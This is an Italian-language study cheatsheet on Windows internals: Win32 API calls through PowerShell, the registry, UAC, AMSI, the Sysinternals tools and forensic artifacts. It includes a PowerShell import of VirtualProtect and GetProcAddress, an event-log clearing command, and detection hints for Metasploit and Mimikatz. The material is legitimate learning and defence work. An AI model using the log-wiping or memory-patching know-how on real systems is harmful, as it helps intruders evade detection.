      [out] SIZE_T  *lpNumberOfBytesWritten
      );
<!-->

- API Calls: chiamate della API utilizzate in un programma con l'indirizzi alle funzioni

- Input output parametri: il valore definito dalle call structures

_Ogni API call della libreria WIN32 risiede in RAM e ogni call richiede un puntatore a un indirizzo di memoria, perà il tutto è oscurato dall'ASLR(Address Space Layout Randomization) che comunque alla fine può essere bypassato con vari metodi tipo:_

- Header file (windows.h):

quando questo header file è incluso nel nostro Unmanaged program(cioè il nostro programma, compilato e runnato) ogni funzione di win32 può essere chiamata per    durante il run-time il loader, capisce qualle chiamate vengono utilizzate, creando una sorta di tabella con i vari indirizzi di memoria o puntatori di indirizzi per le funzioni.

- P/Invoke: altro metodo, come primo passo importiamo la DLL che ci serve, poi definiamo un managed method (metodo controllato dall'OS) come esterno che potremo richiamare come vorremmo.

__Esempio codice di un'API:__

- Dichiarazione e riempito dei parametri di un'API call:
<!-->
    HWND hwnd = CreateWindowsEx(
       	0, 
       	CLASS_NAME, 
       	L"Hello THM!", 
       	WS_OVERLAPPEDWINDOW, 
       	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
       	NULL, 
       	NULL, 
       	hInstance, 
       	NULL
       	);
<!-->

__Implementazione API in .NET e powershell:__
<!-->
    class Win32 {
     	[DllImport("kernel32")]
     	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
     }
     
    static void Main(string[] args) {
     	bool success;
     	StringBuilder name = new StringBuilder(260);
     	uint size = 260;
     	success = GetComputerNameA(name, ref size);
     	Console.WriteLine(name.ToString());
     }
<!-->
    $MethodDefinition = @"
        [DllImport("kernel32")] #importiamo la DLL
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); #importiamo la api call
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    "@; #in powershell vanno definite dentro ad un metodo,
<!-->
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #va creato un nuvo tipo per i puntatori di win32DLL. inoltre verrà creato un       file temporaneo che compilerà queste DLL con csc.exe.
<!-->
    Win32.Kernel32]::<Imported Call>() #comando per utilizzarle
<!-->
### Register Keys

_il Registro di sistema (o Registro Windows) è un database gerarchico che contiene le impostazioni, le configurazioni e altre informazioni cruciali per il corretto funzionamento del sistema operativo e delle applicazioni installate è organizzato in key e subkeys le quali sono:_

 - HKEY_CLASSES_ROOT (HKCR):
   _Questa chiave contiene le associazioni tra estensioni di file e programmi, e definisce come le applicazioni si comportano quando si lavora con tipi di file specifici e in realtà e un 
   insieme delle chiavi HCKU e HKLM_

 - HKEY_CURRENT_USER (HKCU):
   _Questa chiave contiene le impostazioni specifiche dell'utente che sta effettuando l'accesso al sistema. Ad esempio, impostazioni personalizzate, preferenze, stampanti e altro ancora._

 - HKEY_LOCAL_MACHINE (HKLM):
   _Questa chiave contiene le impostazioni relative al computer locale. Qui sono presenti informazioni sul software installato, hardware, configurazioni di sistema e altro ancora._

 - HKEY_USERS (HKU):
   _Questa chiave contiene i profili degli utenti attualmente registrati sul computer. Ogni utente avrà un sottoalbero in questa chiave, simile alla struttura di HKCU._

 - HKEY_CURRENT_CONFIG (HKCC):
   _Questa chiave contiene informazioni sulla configurazione hardware attuale del computer. Viene creato dinamicamente durante l'avvio del sistema._

__Sono importanti da conoscere perchè da lato attaccante possono causare bei danni, dal lato difesa possono essere fonti di informazioni per capire eventuali attacchi ricevuti.__

### UAC

_UAC (User Access Control) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore, è anche all'interno delle MIC(Mandatory Integrity Control) un meccanismo che assegna a utenti,gruppi e processi un IL(Integrity Level) più è alto il livello e più puoi fare cose nel sistema_

_per comprendere appieno l'UAC prima bisogna capire cosa è IL(Integrity Level) e la sua divisione in 4 livelli:_

- Low = utilizzo solo dell'explorer dei file
- Medium = per utenti normali e amministratori con il filtered token
- High = amministratorti con elevated token
- System = livello utilizzato dal utente system

_Ogni IL è poi assegnato ad un UAC token che può essere di diversi tipi:_

 Non-administrators = singolo token utilizzato dagli utenti a IL medium

 Administrators hanno 2 token a loro volta:
   
   - Filtered Token= token per amministratori con meno priviliegi ha IL medium
   - Elevated Token= token con i pieni priviliegi IL hard

_Ora possiamo passare al suo funzionamento parlando in maniera dettagliata dei vari passaggi che la contraddistinguono:_

1) l'utente richiede di runnare un'applicazione come amministratore
2) viene fatta la chiamata alle api ShellExecute che impostando il runas verb apre una shell per elevare i privilegi e in questo modo attivare il meccanismo di
   UAC
3) la richiesta viene girata al service AppInfo.exe che a sua volta andrà a controllare l'application manifest per checkare una possibile autoelevation
4) verrà poi runnato consent.exe che permette di elevare i privilegi, consent.exe verrà runnato in un secure desktop, un desktop che isola i processi per evitare la compromissione dell'UAC
5) l'esito se positivo farà in modo che il nuovo processo creato punti alla shell creata in precendenza per elevare i privilegi.

_Sopra se notiamo bene viene menzionata l'autoelevation, bene è una peculiarità sempre correlata alla user access control e riguarda gli eseguibili i quali possono essere avviati senza il controllo da parte dell'UAC però devono soddisfare dei requisiti:_

- Firmati da Windows Publisher (infatti quasi tutte le funzionalità del pannello di controllo e alcuni eseguibili rientrano nell'autoelevetion)
- essere all'interno di directory fidate come C:\WINDOWS\System32 o C:\Program files

_Ulteriori info per l'autoelevation:_

-.exe devono aver segnato l'autoElevate nel proprio manifest __tool per il controllo del manifest è sigcheck N.B(va scaricata la suite dei sysinternals)__
<!-- -->
      C:\path di sigcheck.exe -m <Path eseguibile da vedere> #comando per leggere il manifest
<!-- -->
- .mmc.exe(microsoft management console) a seconda poi degli .msc snap richiesti ma in genere ha l'autoelevation

__N.B: la UAC può essere modificate nella voce __"UAC settings".____

### AMSI

L'AMSI (Anti-Malware Scan Interface) è un runtime detection integrato con powershell che scannerizza il codice prima che venga runnato e determina se malevolo o meno, viene avviato da defender e evita che lo script malevolo venga runnato nel .NET runtime ed è completamente integrato con:

- _User Account Control, or UAC_
  
- _PowerShell_
  
- _Windows Script Host (wscript and cscript)_
  
- _JavaScript and VBScript_
  
- _Office VBA macros_

_L'AMSI è orchestrato dalla __"System.Management.Automation.dll"__ un .NET assembly sviluppato da Windows e anche dalla __"amsi.dll"__, a seconda del tipo di script o applicazione, vi sono diverse DLL che analizzano il codice tipo:_

- Powershell, VBScript = Win32 API-> AMSI.h, AMSI.lib, AMSI.dll-> AmsiScanBuffer() o AMSIScanString()

- altre applicazioni = COM API-> Amsi.h, Amsi.dll-> lAntimalware::Scan()

- Antivirus = lAntimalwareProvider::Scan()

_Windows defender invece sfrutta le DLL MPEngine.dll e MPSvc.dll_

_L'AMSI si attiva quando lo script è caricato in RAM e poi eseguito dal __"CLR (Common Language Runtime)"__ se invece lo script è nella memoria di massa no_

### Suite SysInternals:

_La suite dei sysinternale è una suite officiale windows con all'suo interno diversi eseguibili che possono essere utili per approfondire di come stia lavorando il pc cioè: analisi dei processi, analidi del disco rigido, controllo degli autorun, controllo connessione di tipo TCP UDP e ecc...
Possiamo reperire la suite o scaricando dal seguente [link](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) o utilizzarli in live dal seguente [link](https://live.sysinternals.com/)._

__Installazione suite:__

_Una volta installata il .zip dal sito linkato sopra, dovremo andare a modificare la variabile d'ambiente del sistema __"PATH"__ in modo che la suite possà essere avviata senza dover ogni volta andare nella cartella contenente i vari tools._

_Comandi:_
<!-- -->
      sysdm.cpl #comando per aprire un'estensione del pannello di controllo che permette di modificare le variabili d'ambiente
<!-- -->
      Avanzate-> Variabili d'ambiente-> Path(Varibili di sistema)-> modifica-> nuovo-> aggiungimamo il path alla cartella contenente la suite-> ok su tutto 	 
      #Linea dettagliata sulle varie voci da seguire per la corretta configurazione
<!-- -->
      diskmon #comando per aprire da cmd diskmon
<!-- -->

__Utilizzo tramite web:__

_Abbiamo la possibilità di utilizzare i sysinternals anche tramite web ma per farlo va installato un client webDAV che permette la connessione da remoto ad una macchina e altre configurazioni da apportare alla nostra macchina._

_Comandi:_
<!-- -->
      Start-Service WebClient #comando powershell per avviare il client webDAV
<!-- -->
      control.exe /name Microsoft.NetworkAndSharingCenter #comando per aprire il pannello per le connessioni di rete
<!-- -->
      Modifica Impostazioni di condivisione avanzate -> attivare Individuazioni di rete pubbliche #attivazione della seguente feature
<!-- -->
      \\live.sysinternals.com\tools\<nome eseguibile> #comando in powershelle per aprire l'eseguibile da remoto
<!-- -->      

##### File e Dischi:

_Utilizzo di eseguibili per l'ispezione e la modifica di file e dischi_

1) SigCheck:

_Command line per la verifica di firme inerenti ad un file_

_Comandi:_
<!-- -->
      sigcheck -u -e C:\Windows\System32 -accepteula #comando per il controllo di file non firmati
<!-- -->
2) Streams:

_Eseguibile da command line che permette di vedere il contenuto degli ADS, esistono però dei comandi in powershell che permettono di visionarli, basta solo cliccare [qui](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#comandi-ads-alternate-data-stream)_

_Comandi:_ 
<!-- -->
      streams <path del file> -accepteula #comando per vedere il contenuto degli ADS
<!-- -->
3) SDelete:

_Tool per cancellare in maniera sicura un file_

_Comandi:_
<!-- -->
      sdelete <path del file> -p <num volte da cancellare> #comando per eliminare in maniera sicura
<!-- -->

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/file-and-disk-utilities) per la lista completa degli eseguibili e di cosa fanno_


##### Rete:

_Tool per il monitoraggio della rete_

1) TCPView:

_Eseguibile che se avviato da un'ottima visiona dei socket in ascolto o delle connessioni stabilite, molto potente se utilizzato con wireshark_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/networking-utilities) per la lista completa degli eseguibili e di cosa fanno_


##### Processi:

_Eseguibili che permettono il monitoraggio dei processi_

1) Autoruns:

_Utility per vedere quali programmi sono configurati per avviarsi quando si fa il login o al momento dell boot del pc_

2) ProcDump:

_Tool che permette di fare il dump dei processi per poi analizzare cosa è successo, è possibilie fare un fulldump o un minidump._

3) ProcessMonitor:

_Utility che permette di controllare i processi, che operazioni stanno facendo e cosa hanno modificato e il tutto è eseguito tranmite dei filtri._

4) PSExec:

_Command line tool che permette di eseguire comandi da remoto, utilizzato per il [lateral movements](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#lateral-movements)._

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/process-utilities) per la lista completa degli eseguibili e di cosa fanno_


##### Sicurezza:

_Eseguibili o command line che danno una visione di insieme sulla sicurezza del computer_

1) Sysmon:

_Agent per il monitoring degli endpoint che puà poi essere integrato in un SIEM_

_Comandi:_
<!-- -->
      Sysmon.exe -accepteula -i <configurazione xml> #comando per avviare sysmon con una configurazione xml
<!-- -->
      Visualizzatore di eventi-> Registri applicazione e servizi-> Microsoft -> Windows -> Sysmon -> Operational #path per vedere gli eventi registrati
<!-- -->
_Best Practices:_ 

1) escludere meglio di includere, perchè cosi si è si sicuri di non dimenticarsi qualche evento

2) Utilizzo della CLI quali Get-WinEvent o wevutil.exe

- __Rilevamento:__

_Piccola sezione dove viene appuntato come rilevare i tool più noti di pentesting_

- _Metasploit:_

_Una buona pratica per cercare l'utilizzo di metasploit è nelle connessioni aperte come la porta 4444 o 5555 per poi fare un'ulteriore ricerca su ProcessID e Image_

- _Mimikatz:_

_Il primo passo per rilevare la presenza di Mimikatz può essere nella ricerca di file creati dallo stesso software o che hanno il suo stesso nome, il secondo passo é nel controllo del LSASS, verificare da quali altri processi viene utilizzato e se vi è una numerosa presenza di svchost.exe può essere un campanello di allarme_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/security-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Informazioni di sistema:
_Tool per visionare informazioni di sistema_

1) winObj:

_Eseguibile utilizzato per vedere le informazioni degli oggetti NT_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_


##### Generali:

_Utilities per info generali sul sitema_

1) BgInfo:

_Utilizzato per scrivere di info generali sul pc avviato_

2) RegJump:

_Piccola utility che apre regedit e va direttamente al valore che si cerca_

_Comandi:_
<!-- -->
      regjump <path valore> -accepteula #comando per andare subito ad un valore  
<!-- -->
_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_

### Forense: 

_Sezione dedicata alla Forense in windows, è un campo importante, perchè sapere dove cercare è anche imparare a nascondersi meglio in un Pentesting_

##### FAT e NTFS:

_Nel mondo della Forense è importante avere anche una visione d'insieme su dove noi andiamo a recuperare i dati, quindi conoscere i vari tipi di file system utilizzati da windows è importante e poi anche avere una sorta d'infarinatura generale non fa male_

- _FAT:_

_FAT (File Allocation Table) è una table ma più precisamente un lista collegata di __"cluster"__(L'unità di storage nel FAT), questa lista contiene lo stato dei cluster cioè se sono liberi o meno e i puntatori al prossimo cluster e infine la grandezza totale del FAT è dato dal numero di bit utilizzati per indirizzare un cluster nella tabella_

_Esistono 4 tipi di FAT:_

1) FAT12 = 12 bit per cluster-> 2^12 = 4096 cluster indirizzabili-> 512B a 8KB di storage per cluster-> volume massimo supportato 32MB

2) FAT16 = 16 bit per cluster-> 2^16 = 65536 cluster indirizzabili-> 2KB a 32KB di storage per cluster-> volume massimo supportato 2GB

3) FAT32 = 28 bit per cluster-> 2^28 = 268,435,456 cluster indirizzabili-> 4KB a 32KB di storage per cluster-> volume massimo supportato 2TB

4) exFAT = 64 bit per cluster-> 2^64 = 18,446,744,073,709,551,616 cluster indirizzabili-> 32MB di storage per cluster-> volume massimo supportato 128P
   questo tipo di filesystem è utilizzato nelle memorie flash come schede SD

- _NTFS:_

_NTFS (New Technology Filesystem) è il più recente filesystem sviluppato da microsoft e muta di molto rispetto al FAT, in primis già cambia per le dimensioni di storage supportate che è molto di più, poi abbiamo il __"Journaling"__, cioè un log ($LOGFILE) che tiene traccia di tutte le modifiche ai metadati, abbiamo i controlli all'accesso i quali definiscono il proprietario di un file e i permessi dei vari utenti a quel file, abbiamo poi la possibilita dei backup con le shadow copies, l'[ADS](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#comandi-ads-alternate-data-stream), compressione e cifrature._

_NTFS piuttosto che avere la File Allocation Table dispone della __"Master File Table"__, una table più complessa rispetto al FAT è un database strutturato che tiene traccia degli oggetti immagazzinati, la __"MFT"__ possiede dei file importanti da un punto di vista forense e sono:_

1) $MFT = MFT è il primo record nel filesystem, contiene poi il VBR (Volume Boot Record) che punta al cluster del MFT infine MFT ha le informazioni sui cluster e quali oggetti contengono

2) $LOGFILE = file di log che registra le varie modifiche nel NTFS

3) $UsnJrnl = è anche chiamato change journal perchè tiene conto di tutte le modifiche apportate ai file e il motivo  si trova nel $Extent record

_Grazie al tool [MFT Explorer](https://ericzimmerman.github.io/#!index.md), andremo a visionare gli MFT files_

_Comandi:_
<!-- -->
     MFTECmd.exe -f <path di $MFT> --csv <path per salvare il csv> #comando di MFTECmd per analizzare il file $MFT
<!-- -->
##### Registri:

_La spiegazione di cosa sono e di quali sono i registri si trova [qui](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#register-keys)_

_Durante un'acquisizione forense, saremmo in possesso di una copia dell'immagine d'analizzare offline è quindi bene sapere dove e quali registri visionare.
La maggior parte dei registri sono collocati in __"C:\Windows\System32\Config"__ e sono:_

- DEFAULT (HKEY__USERS\DEFAULT)

- SAM (HKEY_LOCAL_MACHINE\SAM)

- SECURITY (HKEY_LOCAL_MACHINE\SECURITY)

- SOFTWARE (HKEY_LOCAL_MACHINE\SOFTWARE)

- SYSTEM (HKEY_LOCAL_MACHINE\SYSTEM)

_Vi sono poi ulteriori registri che contengono i dati le informazioni dell'utente e sono:_

- NTUSER.DAT (HKEY_CURRENT_USER) e si trova alla directory (__"C:\Users\<nome user>\"__)

- USRCLASS.DAT (HKEY_CURRENT_USER\Software\CLASSES) e si trova alla directory (__"C:\Users\<nome user>\AppData\Local\Microsoft\Windows"__)

- __File cache, log e backups:__

_Altri file importanti sono quelli di cache, log e backups che generalmente possiamo trovare in:_

- Cache = C:\Windows\AppCompat\Programs\Amcache.hve file che salva dati sui programmati avviati

- Log = C:\Windows\System32\Config cartella dove possiamo trovare i file log dei registri principali salvati con l'estensione .LOG

- Backup = C:\Windows\System32\Config\RegBack cartella con i backup dei registri

- __Informazioni di sistema e account:__

- _Versione OS:_

_La versione dell'OS che stiamo analizzando è possibile verificarla alla path __"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"___

- _Current Control Set:_

_Il current control set è un registro che contiene i dati per la configurazione(Driver,servizi,hardware...) della macchina windows, ne esistono 3 e sono situtati in __"HKLM\SYSTEM"__ invece quando vi è il boot della macchina windows crea un control set volatile chiamato __"HKLM\SYSTEM\CurrentControlSet"__,è infine possibile vedere la configurazione scelta alle path __"SYSTEM\Select\Current"__ e __"SYSTEM\Select\LastKnownGood"___

- _Nome computer:_

_Il nome del computer è possibile trovarlo nel registro __"HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"___

- _Fuso orario:_

_Nell'indagine Forense è bene capire qual'è il fuso orario è possiamo scroprirlo alla path __"HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"___

- _Interfaccie di rete:_

_Possiamo scoprire a quella interfaccia di rete si è connessi a questa path __"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"__ invece per le connessioni di rete passate si può andare qui __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged"__ e __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed"__ ogni rete sarà contrassegnata da un identificatore univoco __"GUID"___

##### File:

- _File recenti:_

_La path dove poter visionare i file aperti in ordine di ultima modifica è __"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"__ e se vogliamo firtare per estensione .txt basta aggiungere dopo __"\RecentDocs\.txt"__.
Possiamo fare un ulteriore indagine per i file office dove possiamo andare a vedere:_

1) HKCU\Software\Microsoft\Office\VERSION

2) HCKU\Software\Microsoft\Office\<num versione>\Word [link](https://docs.microsoft.com/en-us/deployoffice/install-different-office-visio-and-project-versions-on-the-same-computer#office-releases-and-their-version-number) alle versioni di office

3) HCKU\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU

_Un'altro modo per determinare il tipo di file aperto è tramite l lo __"ShellBag"__, cioè le impostazioni di preferenza del layout delle finestre che possono essere trovate alle seguenti path:_

1) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\Bags

2) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\BagMRU

3) HCKU\Software\Microsoft\Windows\Shell\BagMRU

4) HCKU\Software\Microsoft\Windows\Shell\Bags

__N.B: il tool [ShellBag explorer](https://ericzimmerman.github.io/#!index.md) può semplificarci la vita__

- _Box dialogo:_

_Alla seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"__ è possibile risalire a quale ultimo dialogo di box è stato utilizzato e quindi a quelo file o applicazione l'ha chiamato_

- _Ricerche path:_

_Nei registri alle seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery"__ possiamo ricavare le path ricercate dall'utente_

- _File prefetch:_

_Quando un programma in windows vienne avviato crea i file __"prefetch"__, file che raccolgono informazioni per usi futuri tipo, caricare l'eseguibile in maniera più rapida, sonpo utili nella forense perchè registrano quante volte l'eseguibile viene aperto, quali file e handle sono utilizzati dall'eseguibile stesso e il tempo dell'ultimo utilizzo_

_Come al solito Eric Zimmerman metta a disposizione un tool chiamato [PECmd.exe](https://ericzimmerman.github.io/#!index.md) che serve a parsare e in seguito vedere i dati dei file .pf_

_Comandi:_
<!-- --> 
     PECmd.exe -f <path per i file prefetch> --csv <path per salvare il .csv> #comando per estrarre i dati dai file .pf e salvarli in un .csv
<!-- --> 
     PECmd.exe -d <path per la cartella> --csv <path per salvare il .csv > #comando per estrarre i dati da una cartella e salvarli in un .csv
<!-- --> 

##### Applicazioni:

- _UserAssist:_

_Windows tiene traccia delle applicazioni lanciate, il tempo trascorso, e il numero di volte aperto e lo fa per ragioni di statistica però a noi può tornare utile, infatti andando a questo path __"HKCU\\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\<GUID>\Count"__ è possibile visionarle_

- _ShimCache:_

_La ShimCache è un meccanismo che tiene traccia della compatibilità delle applicazioni con l'OS e quando queste vengono lanciate è possibile visionare le info a questa path __"HKLM\SYSTEM\urrentControlSet\Control\Session Manager\AppCompatCache"__ ma per avere una visione migliore dei dati possiamo utilizzare il tool __"[AppCompatCacheParser](https://ericzimmerman.github.io/#!index.md)"__ per creare il .csv con i dati ed infine visionarli con il tool __"[EZViewer](https://ericzimmerman.github.io/#!index.md)"___

_Comandi:_
<!-- -->
      AppCompatCacheParser.exe --csv <file output> -f <path del registro SYSTEM> -c <controlset> #comando per creare il .csv
<!-- -->      
- _AmCache:_

_AmCache è sempre ricollegabile a ShimCache, in quanto entrambi raccolgono dati sulle applicazioni però AmCache, inoltre immagazzina dati come: path, tempo di esecuzione, SHA1 hash dei programmi eseguiti ecc...
Possiamo visionarlo alle seguenti path __"C:\Windows\appcompat\Programs\Amcache.hve"__ dobve è il file .hve e se utilizziamo Registry explorer troviamo l'ultimi programmi eseguiti a questa path __"Amcache.hve\Root\File\<Volume GUID>\"___

- _BAM/DAM:_

_BAM è il background activity monitor, colui che monitora le applicazioni in background mentre DAM è Desktop Activity Moderator colui addetto all'ottimizazione dei consumi del device, entrambi i meccanismi tengono conto delle informazioni riguardanti le ultime applicazioni runnate e possiamo visionarle alle seguenti path __"HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings\<SID>"__ e __"HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings\<SID>"___

- _Windows 10 Timeline:_

_Windows 10 registra le applicazioni utilizzate di recente in un sqlite database chiamato __"Windows 10 Timeline"__ e si trova alla seguent path __"C:\Users\<nome utente>\AppData\Local\ConnectedDevicesPlatform\<cartella casuale>ActivitiesCache.db"__ e tramite il tool [WxTCmd.exe](https://ericzimmerman.github.io/#!index.md) possiamo vederlo_

_Comandi:_
<!-- --> 
     WxTCmd.exe -f <path al file timeline> --csv <path per salvare il csv> #comando che dato il file timeline estrae i dati e li salva in un .csv
<!-- --> 
- _Windows jump lists:_

_le windows jump lists vennero introdotte per aiutare gli utenti ad accedere in maniera più diretta ai file utilizzati di recente è possibile visionarle alla seguente path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations"__, tramie il tool [JLECmd.exe](https://ericzimmerman.github.io/#!index.md)_

_Comandi:_
<!-- --> 
     JLECmd.exe -f <path alla jumplist file> --csv <path per salvare il csv> #comando che prende i dati da un jumplist file e li salva in un .csv
<!-- --> 
- _Collegamenti:_

_I collegamenti, contengono informazioni sulla prima e ultima apertura di un file, la path del file o eseguibile ed è possibile visionarli alle seguenti path __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Recent\"__ e __"C:\Users\<nome utente>\AppData\Roaming\Microsoft\Office\Recent\"__ e come al solito abbiamo il tool per visionarlo il quale è [LECmd.exe](https://ericzimmerman.github.io/#!index.md)_

- _Comandi:_
<!-- --> 
      LECmd.exe -f <path agli shortcut file> --csv <path per salvare il .csv> #comando che dato uno shortcut file crea un .csv con i dati
<!-- --> 
##### Log:

_Il conoscere quali, e dove andare a vedere i Log è importante per avere una visione d'insieme su cosa è successo ad una macchine_

_Possiamo riconoscre i file di log perchè sono salvati con l'estensioni __".evt"__ o __".evtx"__ e li troviamo tipicamente alla path __"C:\Windows\System32\winevt\Logs"___

- _Event Viewer:_

_event viewer è il software integrato in windows che permette la visione dei log, lo stesso software divide i log in diversi gruppi per semplificarne la ricerca e visualizzazione, le tipologia sono:_

1) Log di sistema = Log del sistema operativo windows

2) Log di sicurezza = Log inerenti al logon e logoff nel device o i diversi eventi di sicurezza

3) Log applicazioni = Log delle applicazioni quando vi sono eventi, crash o warnings

4) Directory Service Events = Log dell'Active Directory più specificatamente per i domain controller

5) Log di DNS = Log per gli eventi DNS

6) Log personalizzati = Log utilizzati dalle applicazioni che richiedono più memoria

- _wevutil.exe:_

_wevutil.exe o Windows Events Commandline Utility permette di automatizzare il processo di visionare le miriade di log presenti in un PC con diverse tipologia di commandi_

_Comandi:_
<!-- --> 
     wevutil.exe export-log <tipologia di eventi> <path dove salvare in .XML> #comando per esportare un file log
<!-- --> 
     wevutil.exe query-log <tipologia di eventi> --filter "<filtro query>" --output-format:xml #comando per fare una query su una tipologia di eventi
<!-- --> 
     wevutil.exe clear-log <tipologia di eventi> #comando che permette di ripulire una tipologia di eventi
<!-- --> 
     wevutil.exe get-log <tipologia di eventi> #comando per ottenere maggiori info su una tipologia di eventi
<!-- --> 
     wevtutil.exe set-log <tipologia di eventi> /level:<tipologia di registrazione> /maxsize:<dimensione log> #comando che imposta alcune opzioni su una data tipologia di eventi
<!-- --> 
- _Get-WinEvent:_

_Comando powershell che permette di automatizzare il processo di visione dei log_

- _Comandi:_
<!-- --> 
      Get-WinEvent -ListLog * #comando che recupera tutti i log
<!-- --> 
      Get-WinEvent -ListProvider * #comando che recupera i nome dei provider dei log
<!-- --> 
      Get-WinEvent -LogName <nome> | Where-Object { $_.ProviderName -Match 'WSMan' } #comando che filtra i log
<!-- --> 

- _XPath:_

_XPath (XML Path Language) è un linguaggio per navigare ed interrogare i documenti scritti in XML_

_Quando si utilizza Event Viewer cliccando su evento, poi andando in dettagli e cliccando XML potremmo notare il medesimo evento scritto in XML e potrà essere utilizzato per le nostre XPath queries_

ES:
<!-- --> 
	- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">  #Event o * indica l'inizio del XML
	- <System>`  #campo utilizzato per il filtraggio dei parametri dentro Systenm
	  <Provider Name="HP Comm Recovery" /> #campo per il filtraggio tramite nome del Provider Name
	  <EventID Qualifiers="0">1</EventID>  #campo per il filtraggio nel comando tramite il numero dell'event ID
	  <Version>0</Version> 
	  <Level>4</Level> 
	  <Task>0</Task> 
	  <Opcode>0</Opcode> 
	  <Keywords>0x80000000000000</Keywords> 
	  <TimeCreated SystemTime="2023-08-31T20:03:39.3352531Z" /> 
	  <EventRecordID>7684</EventRecordID> 
	  <Correlation /> 
	  <Execution ProcessID="5884" ThreadID="0" /> 
	  <Channel>Application</Channel> 
	  <Computer>alessandro</Computer> 
	  <Security /> 
	  </System>
	- <EventData> #campo utilizzato per il filtraggio dei parametri dentro EventData
	  <Data>Resume from Connected Standby</Data> 
	  </EventData>
	  </Event>`
<!-- --> 
_Comando esempio XPath dall'evento xml sopra:_
<!-- --> 
	Get-WinEvent -LogName <tipologia nome evento> -FilterXPath '*/System/EventID=<num evento> or /Provider[@Name="<nome provider>"]'
<!-- --> 

_Un ottimo di logging è [Sysmon](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#sicurezza), preinstallato in windows_

##### Device Esterni:

- _USB:_

_Tramite ai registri è possibile risalire a diverse informazioni inerenti i device USB alle seguenti path:_

1) HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR o \USB è possibile reperire ID vendor, ID prodotto, versione USB

2) SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\<id usb>\---- al posto dei ---- possono esserci i numeri 0064 (Tempo prima connessione), 0066(tempo ultima connessione) e 0067 (tempo ultima rimozione)

3) HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices possiamo trovare i nomi

_Possiamo reperire alla seguente path __"C:\Windows\inf\setupapi.dev.log"__ diverse informazioni sul device USB_
   
##### Tool Forense:

_Parte fondamentale nella forense oltre a chi investigava, lo sono anche i tool quali:_

_Acquisizione_

- [FTKImager](https://www.exterro.com/ftk-imager)

- [Autopsy](https://www.autopsy.com/)

_Registri_

- [RegRipper](https://github.com/keydet89/RegRipper3.0)

- [Tool Eric Zimmerman's: Registry Explorer](https://ericzimmerman.github.io/#!index.md)

__N.B: I tool sviluppati da Eric Zimmerman's sono gratuti e molto utili__

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._

_MMC(Microsoft management console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WMI è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_

# Credits:

_Molte informazioni inerenti a questa repo non sono state prese dal nulla, ma sono l'insieme di varie macchine, room e moduli teorici svolti nei seguenti siti:_

- [HackTheBox-Academy](https://academy.hackthebox.com/)

- [TryHackMe](https://tryhackme.com/)

